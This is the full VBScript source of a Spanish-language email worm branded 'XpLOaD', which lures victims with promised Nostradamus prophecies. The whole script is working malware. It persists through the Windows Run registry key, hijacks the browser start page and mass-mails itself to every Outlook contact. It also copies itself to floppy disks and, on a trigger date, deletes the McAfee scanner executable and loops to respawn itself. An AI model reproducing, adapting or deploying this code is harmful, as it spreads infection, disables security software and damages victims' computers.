   '(c) Conoce las profecias de Nostradamus. XpLOaD

   On Error Resume Next

   Dim ObjetoShell, ArchivoSistema, RutaActual

   Set ObjetoShell = CreateObject("WScript.shell")
   Set ArchivoSistema = CreateObject("Scripting.FileSystemObject")

   'INSTALACION.
   'Las siguientes instrucciones instalan el virus en la computadora y lo configuran
   'para que pueda actuar adecuadamente.

   If ObjetoShell.regread ("HKCU\software\XpLOaD\Instalacion") <> "1" then
       MsgBox "Las grandes profecias de Nostradamus hablaban del fin de tu ordenador." & chr(13) & "Y muy pronto se cumplira", 64, "Las profecias de Nostradamus"
       ObjetoShell.regwrite "HKCU\software\XpLOaD\Instalacion", "1"
   End if

   ObjetoShell.regwrite "HKCU\software\XpLOaD\Creador", "XpLOaD"
   ObjetoShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XpLOaD","wscript.exe " & ArchivoSistema.GetSpecialFolder(0) & "\Nostradamus.txt.vbs %"

   ObjetoShell.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.astalavista.com"
   ObjetoShell.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title","El fin del mundo se acerca"

   ArchivoSistema.CopyFile wscript.scriptfullname, ArchivoSistema.GetSpecialFolder(0) & "\Nostradamus.txt.vbs"

   '************************************************************
   '************************************************************
   '************************************************************

   If ObjetoShell.regread ("HKCU\software\XpLOaD\Enviado") = "" then
       ObjetoShell.regwrite "HKCU\software\XpLOaD\Enviado", "1"
   end if

   'CONTAGIO.
   'Las siguientes instrucciones llevaban a cabo la infeccion
   If ObjetoShell.regread ("HKCU\software\XpLOaD\Enviado") <> "1" then
       Enviar_Mail()
   else
       Escribir_A()
   End if

   '************************************************************
   '************************************************************
   '************************************************************
   'PAYLOADS

   if month(now) =4 and day(now) =30 then
       ArchivoSistema.DeleteFile "C:\Archivos de programa\McAfee\McAfee VirusScan\VsMain.exe"

       Set RepAr= ArchivoSistema.opentextfile(wscript.scriptfullname, 1)
       Contenido = RepAr.readall
       RepAr.Close

       Do
       If Not (ArchivoSistema.fileexists(wscript.scriptfullname)) Then
           Set NueCrea= ArchivoSistema.createtextfile(wscript.scriptfullname, True)
           ArchivoSistema.write Contenido
           NueCrea.Close
       End If
       Loop
   end if

   '************************************************************
   '************************************************************
   '************************************************************
   'FUNCIONES

   'FUNCION PARA ESCRIBIR A LA UNIDAD A

   Function Escribir_A()
       Randomize
       NombreAleatorio = chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))+chr(Int(Rnd * 100))
       Do
           Temporizador = Temporizador + 1
           If Temporizador = 9000000 then
               ArchivoSistema.copyfile ArchivoSistema.GetSpecialFolder(0)& "\Nostradamus.txt.vbs","a:\" & NombreAleatorio & ".vbs"
               Temporizador = 0
           End If
           If Temporizador = 7000000 then
               ObjetoShell.sendkeys "Se aproxima el fin del mundo....."
           End If
       Loop
   ObjetoShell.regwrite "HKCU\software\XpLOaD\Contagio", "0"
   End Function

   'FUNCION PARA ENVIAR MAIL

   Function Enviar_Mail()

   On Error Resume Next

   if ObjetoShell.regread ("HKCU\software\XpLOaD\Enviado") <> "1" then

   Set outlook = CreateObject("Out" + "look" + "." + "Appli" + "cation")

       Set MAPI=outlook.GetNameSpace("MA"+"PI")
       Set direcciones= mapi.AddressLists

       For Each direccion In direcciones
           If direccion.AddressEntries.Count <> 0 Then
           contador = direccion.AddressEntries.Count
               For I= 1 To contador
                   Set email = outlook.CreateItem(0)
                   Set destino = direccion.AddressEntries(I)
                   email.To = destino.Address
                   email.Subject = "Nuevas Profecias de Nostradamus"
                   email.Body = "Muy pocos sabemos las verdaderas profecias de Nostradamus sobre el findel mundo. Si deseas conocerlas puedes descarga el archivo adjunto, ejecutalo y seras uno mas de los portadores de la verdad." + chr(13) + "(C) Michel de Nostradamus by XpLOaD"
                   set FicheroAdjunto=email.Attachments
                   FicheroAdjunto.Add ArchivoSistema.GetSpecialFolder(0) & "\MiVirisVBS.txt."+"v"+"b"+"s"

                   email.send
                   ObjetoShell.regwrite "HKCU\software\XpLOaD\Enviado", "1"

               Next
           else
               exit for
           End If
       Next

   End if

   ObjetoShell.regwrite "HKCU\software\XpLOaD\Contagio", "1"

   End Function
